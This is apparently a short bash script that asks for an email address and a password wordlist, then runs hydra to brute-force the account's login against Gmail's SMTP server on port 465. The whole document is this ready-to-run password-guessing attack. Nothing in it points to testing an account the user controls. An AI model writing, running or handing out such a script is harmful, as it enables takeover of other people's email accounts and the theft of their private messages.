clear
echo enter mail :
read varname
echo enter wordlist :
read wordname
hydra -l $varname -P $wordname -s 465 -S -v -V -t 4 smtp.gmail.com smtp




